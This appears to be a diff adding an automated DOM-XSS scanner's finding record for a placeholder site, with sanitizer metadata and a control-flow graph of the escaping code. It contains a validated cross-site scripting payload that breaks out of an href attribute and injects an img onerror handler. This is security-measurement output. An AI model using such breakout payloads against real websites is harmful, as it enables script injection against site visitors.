@@ -1,0 +1,127 @@
+// Finding: c0d0df4b-03db-475f-afb0-09dde3b2010e
+// Finding.url: https://cm-us.example124.com/public/browser.html?realm=us&service=wgnp"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('c49ac902b0914cca94d45833b5cb74a0')><!--/*&project=all&language=en&frontend_url=https://cdn-cm.example368.com
+// Finding.parentloc: https://cm-us.example124.com/public/browser.html?realm=us&service=wgnp"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('c49ac902b0914cca94d45833b5cb74a0')><!--/*&project=all&language=en&frontend_url=https://cdn-cm.example368.com
+// Finding.domain: cm-us.example124.com
+// Finding.base_domain: example124.com
+// Finding.source: location.search
+// Finding.sink: innerHTML
+// Sanitizer.score: 6
+// Sanitizer.name: a.escape</<
+// Sanitizer.location: https://cdn-cm.example368.com/loader.min.js - a.escape</<:1:8367
+// Finding.begin: 27313
+// Finding.end: 27345
+// Finding.original_uuid: f4cc63cb-aca0-4213-bee2-0eaecb83dfc5
+// Finding.TwentyFiveMillionFlowsId: 1861454300
+// Finding.script: https://cdn-cm.example368.com/plugin/services-dropdown.min.js?1.1.20
+// Finding.line: 1
+// Exploit.uuid: c49ac902-b091-4cca-94d4-5833b5cb74a0
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: wgnp"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: wgnp"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 65
+// Exploit.end_taint_url: 69
+// Exploit.replace_begin_url: 65
+// Exploit.replace_end_url: 69
+// Exploit.replace_begin_param: 3781
+// Exploit.replace_end_param: 3785
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: true
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: true
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -496625725
+// DepGraph.sanitizer_hash: -1129684351
+// Removed LR concats 
+// Removed LR concats 
+// Non Finite Regex with function on rhs:  replace((?:&|<|>|"|'|`)/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(<: 1, >: 1, &: 1, ": 1, ': 1, `: 1), function_rhs: true], 'function(a){return c[a]}') - Left hand side has to be a range 
+// Approximated Implementation for:  replace((?:&|<|>|"|'|`)/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(<: 1, >: 1, &: 1, ": 1, ': 1, `: 1), function_rhs: true], 'function(a){return c[a]}') - Left hand side has to be a range 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 1"];
+n4 [shape=ellipse, label="regex_exec"];
+n5 [shape=box, label="RegExp: /([^&=]+)=?([^&]*)/"];
+n6 [shape=box, label="Lit: 2"];
+n7 [shape=box, label="Var: x"];
+n8 [shape=ellipse, label="preg_replace"];
+n9 [shape=box, label="RegExp: /\+/"];
+n10 [shape=box, label="Lit:  "];
+n11 [shape=box, label="Var: x"];
+n12 [shape=ellipse, label="decodeURIComponent"];
+n13 [shape=box, label="Var: x"];
+n14 [shape=ellipse, label="encodeURIComponent"];
+n15 [shape=box, label="Var: x"];
+n16 [shape=ellipse, label="."];
+n17 [shape=box, label="Lit: utm_campaign="];
+n18 [shape=ellipse, label="."];
+n19 [shape=box, label="Lit: &"];
+n20 [shape=ellipse, label="."];
+n21 [shape=box, label="Lit: &"];
+n22 [shape=ellipse, label="."];
+n23 [shape=box, label="Lit: ?"];
+n24 [shape=ellipse, label="."];
+n25 [shape=box, label="Lit: http://wiki.example124.com/"];
+n26 [shape=ellipse, label="."];
+n27 [shape=box, label="Lit: &#x27;"];
+n28 [shape=ellipse, label="preg_replace"];
+n29 [shape=box, label="RegExp: /(?:&|<|>|"|'|`)/"];
+n30 [shape=box, label="Lit: "];
+n31 [shape=box, label="Var: x"];
+n32 [shape=box, label="Var: x"];
+n33 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n7 -> n1;
+n4 -> n5;
+n4 -> n6;
+n4 -> n7;
+n11 -> n4;
+n8 -> n9;
+n8 -> n10;
+n8 -> n11;
+n13 -> n8;
+n12 -> n13;
+n15 -> n12;
+n14 -> n15;
+n16 -> n17;
+n16 -> n14;
+n18 -> n19;
+n18 -> n16;
+n20 -> n18;
+n20 -> n21;
+n22 -> n23;
+n22 -> n20;
+n24 -> n25;
+n24 -> n22;
+n26 -> n24;
+n26 -> n27;
+n31 -> n26;
+n28 -> n29;
+n28 -> n30;
+n28 -> n31;
+n32 -> n28;
+n33 -> n32;
+}
